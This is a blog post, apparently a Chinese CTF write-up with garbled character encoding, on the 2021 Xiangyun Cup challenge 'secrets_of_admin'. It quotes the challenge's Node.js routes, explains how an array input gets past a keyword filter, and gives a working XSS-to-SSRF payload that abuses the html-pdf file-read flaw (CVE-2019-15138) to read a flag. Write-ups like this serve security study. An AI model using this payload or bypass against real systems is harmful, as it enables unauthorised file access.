<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="suyumen"><meta name="renderer" content="webkit"><meta name="copyright" content="suyumen"><meta name="keywords" content="SUYUMEN"><meta name="description" content=""><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>2021ç¥¥äº‘æ¯secrets_of_admin Â· SUYUMEN</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicon.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
  "use strict";
  // rel=preload support test
  if( !w.loadCSS ){
    w.loadCSS = function(){};
  }
  // define on the loadCSS obj
  var rp = loadCSS.relpreload = {};
  // rel=preload feature support test
  // runs once and returns a function for compat purposes
  rp.support = (function(){
    var ret;
    try {
      ret = w.document.createElement( "link" ).relList.supports( "preload" );
    } catch (e) {
      ret = false;
    }
    return function(){
      return ret;
    };
  })();

  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
  // then change that media back to its intended value on load
  rp.bindMediaToggle = function( link ){
    // remember existing media attr for ultimate state, or default to 'all'
    var finalMedia = link.media || "all";

    function enableStylesheet(){
      link.media = finalMedia;
    }

    // bind load handlers to enable media
    if( link.addEventListener ){
      link.addEventListener( "load", enableStylesheet );
    } else if( link.attachEvent ){
      link.attachEvent( "onload", enableStylesheet );
    }

    // Set rel and non-applicable media type to start an async request
    // note: timeout allows this to happen async to let rendering continue in IE
    setTimeout(function(){
      link.rel = "stylesheet";
      link.media = "only x";
    });
    // also enable media after 3 seconds,
    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
    setTimeout( enableStylesheet, 3000 );
  };

  // loop through link elements in DOM
  rp.poly = function(){
    // double check this to prevent external calls from running
    if( rp.support() ){
      return;
    }
    var links = w.document.getElementsByTagName( "link" );
    for( var i = 0; i < links.length; i++ ){
      var link = links[ i ];
      // qualify links to those with rel=preload and as=style attrs
      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
        // prevent rerunning on link
        link.setAttribute( "data-loadcss", true );
        // bind listeners to toggle media back
        rp.bindMediaToggle( link );
      }
    }
  };

  // if unsupported, run the polyfill
  if( !rp.support() ){
    // run once at least
    rp.poly();

    // rerun poly on an interval until onload
    var run = w.setInterval( rp.poly, 500 );
    if( w.addEventListener ){
      w.addEventListener( "load", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    } else if( w.attachEvent ){
      w.attachEvent( "onload", function(){
        rp.poly();
        w.clearInterval( run );
      } );
    }
  }


  // commonjs
  if( typeof exports !== "undefined" ){
    exports.loadCSS = loadCSS;
  }
  else {
    w.loadCSS = loadCSS;
  }
}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><meta name="generator" content="Hexo 5.4.0"></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/avatar.jpg"></div><!--.profile-saying
  i.fa.fa-comment
  .saying--><div class="cxo-profile-inner"><div class="profile-name">suyumen</div><div class="profile-signature">ç›®å‰ä¸»è¦åœ¨å­¦ä¹ webç›¸å…³</div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/back.jpg);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">SUYUMEN</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">2021ç¥¥äº‘æ¯secrets_of_admin</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2021-10-12</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="ssrf"> ssrf</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="js"> js</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="xss"> xss</a><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="http-pdf"> http-pdf</a></span></div><div class="post-intro-read"><span> Word count: <span class="post-count">988</span> | Reading time: <span class="post-count">5</span>min</span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><p>ç”¨çš„<code>buu</code>çš„ç¯å¢ƒã€‚é¡µé¢<code>title</code>æ˜¯<code>uesless</code>ï¼Œç›´æ¥çœ‹é™„ä»¶ï¼Œæœ<code>admin</code>ï¼Œåœ¨<code>database.ts</code>æ–‡ä»¶é‡Œå‘ç°<code>admin</code>çš„åˆ›å»ºä»£ç ï¼š</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> users (id, username, password) <span class="keyword">VALUES</span> (<span class="number">1</span>, <span class="string">&#x27;admin&#x27;</span>,<span class="string">&#x27;e365655e013ce7fdbdbf8f27b418c8fe6dc9354dc4c0328fa02b0ea547659645&#x27;</span>);</span><br></pre></td></tr></table></figure>

<span id="more"></span>

<p>ç”¨è¿™ä¸ªç™»å½•æˆåŠŸäº†ï¼š</p>
<p><img src="https://img-blog.csdnimg.cn/8843b41b2a3748f895aea724372c3b7c.jpg?x-oss-process=image/watermark,type_ZHJvaWRzYW5zZmFsbGJhY2s,shadow_50,text_Q1NETiBA6ZqL5aSn5YWt,size_20,color_FFFFFF,t_70,g_se,x_16#pic_center"></p>
<p>çœ‹ä¸€ä¸‹è¿™ä¸ªæ¡†æ¡†çš„é€»è¾‘ï¼š</p>
<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">router.post(<span class="string">&#x27;/admin&#x27;</span>, checkAuth, <span class="function">(<span class="params">req, res, next</span>) =&gt;</span> &#123;</span><br><span class="line">    <span class="keyword">let</span> &#123; content &#125; = req.body;</span><br><span class="line">    <span class="keyword">if</span> ( content == <span class="string">&#x27;&#x27;</span> || content.includes(<span class="string">&#x27;&lt;&#x27;</span>) || content.includes(<span class="string">&#x27;&gt;&#x27;</span>) || content.includes(<span class="string">&#x27;/&#x27;</span>) || content.includes(<span class="string">&#x27;script&#x27;</span>) || content.includes(<span class="string">&#x27;on&#x27;</span>))&#123;</span><br><span class="line">        <span class="comment">// even admin can&#x27;t be trusted right ? :)  </span></span><br><span class="line">        <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">error</span>: <span class="string">&#x27;Forbidden word ğŸ¤¬&#x27;</span>&#125;);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">let</span> template = <span class="string">`</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">        &lt;meta charset=&quot;utf8&quot;&gt;</span></span><br><span class="line"><span class="string">        &lt;title&gt;Create your own pdfs&lt;/title&gt;</span></span><br><span class="line"><span class="string">        &lt;body&gt;</span></span><br><span class="line"><span class="string">        &lt;h3&gt;<span class="subst">$&#123;content&#125;</span>&lt;/h3&gt;</span></span><br><span class="line"><span class="string">        &lt;/body&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        `</span></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">const</span> filename = <span class="string">`<span class="subst">$&#123;uuid()&#125;</span>.pdf`</span></span><br><span class="line">            pdf.create(template, &#123;</span><br><span class="line">                <span class="string">&quot;format&quot;</span>: <span class="string">&quot;Letter&quot;</span>,</span><br><span class="line">                <span class="string">&quot;orientation&quot;</span>: <span class="string">&quot;portrait&quot;</span>,</span><br><span class="line">                <span class="string">&quot;border&quot;</span>: <span class="string">&quot;0&quot;</span>,</span><br><span class="line">                <span class="string">&quot;type&quot;</span>: <span class="string">&quot;pdf&quot;</span>,</span><br><span class="line">                <span class="string">&quot;renderDelay&quot;</span>: <span class="number">3000</span>,</span><br><span class="line">                <span class="string">&quot;timeout&quot;</span>: <span class="number">5000</span></span><br><span class="line">            &#125;).toFile(<span class="string">`./files/<span class="subst">$&#123;filename&#125;</span>`</span>, <span class="keyword">async</span> (err, _) =&gt; &#123;</span><br><span class="line">                <span class="keyword">if</span> (err) next(createError(<span class="number">500</span>));</span><br><span class="line">                <span class="keyword">const</span> checksum = <span class="keyword">await</span> getCheckSum(filename);</span><br><span class="line">                <span class="keyword">await</span> DB.Create(<span class="string">&#x27;superuser&#x27;</span>, filename, checksum)</span><br><span class="line">                <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">message</span> : <span class="string">`Your pdf is successfully saved ğŸ¤‘ You know how to download it right?`</span>&#125;);</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.render(<span class="string">&#x27;admin&#x27;</span>, &#123; <span class="attr">error</span> : <span class="string">&#x27;Failed to generate pdf ğŸ˜¥&#x27;</span>&#125;)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p><code>post</code>çš„ä¸œè¥¿å…ˆæ’å…¥<code>html</code>å†å˜æˆ<code>letter</code>æ ¼å¼çš„<code>pdf</code>ï¼Œè¿‡æ»¤äº†<code>&lt;ï¼Œ&gt;ï¼Œ/ï¼Œscriptï¼Œon</code>,å¯ä»¥<code>xss</code>æ³¨å…¥ã€‚</p>
<hr>
<h3 id="includes-æ–¹æ³•ç»•è¿‡"><a href="#includes-æ–¹æ³•ç»•è¿‡" class="headerlink" title="includes()æ–¹æ³•ç»•è¿‡"></a>includes()æ–¹æ³•ç»•è¿‡</h3><blockquote>
<p>includes() æ–¹æ³•ç”¨æ¥åˆ¤æ–­ä¸€ä¸ªæ•°ç»„æ˜¯å¦åŒ…å«ä¸€ä¸ªæŒ‡å®šçš„å€¼ï¼Œå¦‚æœæ˜¯è¿”å› trueï¼Œå¦åˆ™falseã€‚</p>
</blockquote>
<p><strong>è¿™é‡Œå¯ä»¥ç”¨æ•°ç»„è¿›è¡Œç»•è¿‡</strong>ã€‚â€œå½“å…¶ä¸ºæ•°ç»„æ—¶ <code>include()</code><br>ä¼šå¤±è´¥â€</p>
<hr>
<p>è¿˜æœ‰ä¸€ä¸ªè·¯ç”±ï¼Œè¦æ±‚<code>checksum</code>æ˜¯<code>string</code>ï¼Œ<code>username</code>ä¸èƒ½æ˜¯ä¸Šä¼ <code>pdf</code>æ—¶çš„<code>superuser</code>ã€‚</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/api/files&#x27;</span>, <span class="keyword">async</span> (req, res, next) =&gt; &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.socket.remoteAddress.replace(<span class="regexp">/^.*:/</span>, <span class="string">&#x27;&#x27;</span>) != <span class="string">&#x27;127.0.0.1&#x27;</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> next(createError(<span class="number">401</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> &#123; username , filename, checksum &#125; = req.query;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span>(username) == <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(filename) == <span class="string">&quot;string&quot;</span> &amp;&amp; <span class="keyword">typeof</span>(checksum) == <span class="string">&quot;string&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">await</span> DB.Create(username, filename, checksum)</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Done&#x27;</span>)</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Error!&#x27;</span>)</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.send(<span class="string">&#x27;Parameters error&#x27;</span>)</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">router.get(<span class="string">&#x27;/api/files/:id&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    <span class="keyword">let</span> token = req.signedCookies[<span class="string">&#x27;token&#x27;</span>]</span><br><span class="line">    <span class="keyword">if</span> (token &amp;&amp; token[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">        <span class="keyword">if</span> (token.username == <span class="string">&#x27;superuser&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Superuser is disabled now&#x27;</span>);   </span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">let</span> filename = <span class="keyword">await</span> DB.getFile(token.username, req.params.id)</span><br><span class="line">            <span class="keyword">if</span> (fs.existsSync(path.join(__dirname , <span class="string">&quot;../files/&quot;</span>, filename)))&#123;</span><br><span class="line">                <span class="keyword">return</span> res.send(<span class="keyword">await</span> readFile(path.join(__dirname , <span class="string">&quot;../files/&quot;</span>, filename)));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">return</span> res.send(<span class="string">&#x27;No such file!&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (err) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.send(<span class="string">&#x27;Error!&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> res.redirect(<span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<h3 id="http-pdf-ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´"><a href="#http-pdf-ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´" class="headerlink" title="http-pdf ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´"></a>http-pdf ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</h3><p>ï¼ˆCVE-2019-15138ï¼‰</p>
<blockquote>
<p>html-pdf is a Html to pdf converter in nodejs.</p>
</blockquote>
<blockquote>
<p>Affected versions of this package are vulnerable to Arbitrary File Read. The package fails to sanitize the HTML input, allowing attackers to exfiltrate server files by supplying malicious HTML code. XHR requests in the HTML code are executed by the server. Input with an XHR request such as will result in a PDF document with the contents of .request.open(â€œGETâ€,â€file:///etc/passwdâ€)/etc/passwd</p>
</blockquote>
<p>åœ¨packageé‡Œå¯ä»¥çœ‹åˆ°ï¼š</p>
<p><code>&quot;html-pdf&quot;: &quot;^2.2.0&quot;</code></p>
<p>ä½¿ç”¨äº†è¿™ä¸ªåº“ï¼Œå› æ­¤å¯ä»¥ç”¨<code>XHR</code>æ„é€ ä»»æ„æ–‡ä»¶è¯»å–ã€‚</p>
<hr>
<h2 id="XMLHttpRequestæ¥å£"><a href="#XMLHttpRequestæ¥å£" class="headerlink" title="XMLHttpRequestæ¥å£"></a>XMLHttpRequestæ¥å£</h2><p><a target="_blank" rel="noopener" href="https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest">https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest</a></p>
<p>1.<code>XMLHttpRequest()</code>:æ„é€ å‡½æ•°ã€‚</p>
<p>2.<code>XMLHttpRequest.abort()</code>:</p>
<p>å¦‚æœè¯·æ±‚å·²è¢«å‘å‡ºï¼Œåˆ™ç«‹åˆ»ä¸­æ­¢è¯·æ±‚ã€‚</p>
<p>3.<code>XMLHttpRequest.open()</code>:</p>
<p>åˆå§‹åŒ–ä¸€ä¸ªè¯·æ±‚ã€‚è¯¥æ–¹æ³•åªèƒ½åœ¨<code>JavaScript</code>ä»£ç ä¸­ä½¿ç”¨ã€‚</p>
<p><code>xhrReq.open(method, url, [async], [user], [password]);</code></p>
<p>4.<code>XMLHttpRequest.setRequestHeader()</code>:</p>
<p>è®¾ç½®HTTPè¯·æ±‚å¤´éƒ¨ã€‚</p>
<p><code>myReq.setRequestHeader(header, value);</code></p>
<p>å‘é€è¯·æ±‚ã€‚å¦‚æœè¯·æ±‚æ˜¯å¼‚æ­¥çš„ï¼ˆé»˜è®¤ï¼‰ï¼Œé‚£ä¹ˆè¯¥æ–¹æ³•å°†åœ¨è¯·æ±‚å‘é€åç«‹å³è¿”å›ã€‚</p>
<p>5.<code>XMLHttpRequest.send()</code>:</p>
<p><code>XMLHttpRequest.send([body])</code></p>
<p><code>body</code>ï¼š</p>
<p>å¯ä»¥ä¸º<code>Document</code>, åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œå®ƒåœ¨å‘é€ä¹‹å‰è¢«åºåˆ—åŒ–ã€‚</p>
<p>å¯ä»¥ä¸º<code>XMLHttpRequestBodyInit</code>,<code>Blob</code>, <code>BufferSource (en-US)</code>, <code>FormData</code>, <code>URLSearchParams</code>, æˆ–è€… <code>USVString</code> å¯¹è±¡ã€‚</p>
<p>é»˜è®¤ä¸º<code>null</code>ã€‚</p>
<hr>
<p><code>ssrf</code>è¯»<code>flag</code>ã€‚</p>
<p>payloadï¼š</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">post:</span><br><span class="line">content[]=<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"></span></span><br><span class="line"><span class="javascript">    <span class="keyword">var</span> xhr = <span class="keyword">new</span> XMLHttpRequest();</span></span><br><span class="line"><span class="javascript">    xhr.open( <span class="string">&quot;GET&quot;</span> , <span class="string">&quot;http://127.0.0.1:8888/api/files?username=admin&amp;checksum=aaa&amp;filename=./flag&quot;</span>);</span></span><br><span class="line"><span class="javascript">    xhr.send();</span></span><br><span class="line"><span class="javascript"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>å†è®¿é—®æ–‡ä»¶ä½ç½®ä¸‹è½½å¾—åˆ°<code>flag</code>ã€‚</p>
<p>å¥½éš¾å¥½éš¾å¥½éš¾ä¹Œä¹Œã€‚ã€‚</p>
<h3 id="tips"><a href="#tips" class="headerlink" title="tips"></a>tips</h3><p>1.æ•°ç»„ç»•è¿‡<code>js</code>çš„<code>includes</code>è¿‡æ»¤ï¼</p>
<p>xssç»•è¿‡ï¼š<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_50464560/article/details/119295255">https://blog.csdn.net/weixin_50464560/article/details/119295255</a></p>
<p>2.<code>ts</code>å¼€æ”¾åœ¨<code>8888</code>ç«¯å£</p>
<h3 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h3><p>1.æˆ˜é˜Ÿwp</p>
<p>2.<a target="_blank" rel="noopener" href="https://blog.csdn.net/rfrder/article/details/119914746">https://blog.csdn.net/rfrder/article/details/119914746</a></p>
<p>3.<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_25500649/article/details/119997195">https://blog.csdn.net/qq_25500649/article/details/119997195</a></p>
</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="https://suyumen.github.io">suyumen</a></p><p> <span>Link:  </span><a href="https://suyumen.github.io/2021/10/12/2021-10-12-[2021%E7%A5%A5%E4%BA%91%E6%9D%AF]secrets_of_admin/">https://suyumen.github.io/2021/10/12/2021-10-12-[2021%E7%A5%A5%E4%BA%91%E6%9D%AF]secrets_of_admin/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license noopener" target="_blank" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="prevSlogan" href="/2021/11/10/2021-11-01-%5B2021%E7%A5%A5%E4%BA%91%E6%9D%AF%5Dcralwer_z/" title="2021ç¥¥äº‘æ¯cralwer_z"><span>< PreviousPost</span><br><span class="prevTitle">2021ç¥¥äº‘æ¯cralwer_z</span></a><a class="nextSlogan" href="/2021/09/10/2021-09-10-%5BHF2021%5Dhatenum/" title="HF2021-hatenum"><span>NextPost ></span><br><span class="nextTitle">HF2021-hatenum</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by <span>Hexo</span></span><span> | theme <span>Cxo</span></span></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#includes-%E6%96%B9%E6%B3%95%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">includes()æ–¹æ³•ç»•è¿‡</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#http-pdf-%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E"><span class="toc-number">2.</span> <span class="toc-text">http-pdf ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#XMLHttpRequest%E6%8E%A5%E5%8F%A3"><span class="toc-number"></span> <span class="toc-text">XMLHttpRequestæ¥å£</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#tips"><span class="toc-number">1.</span> <span class="toc-text">tips</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%82%E8%80%83"><span class="toc-number">2.</span> <span class="toc-text">å‚è€ƒ</span></a></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>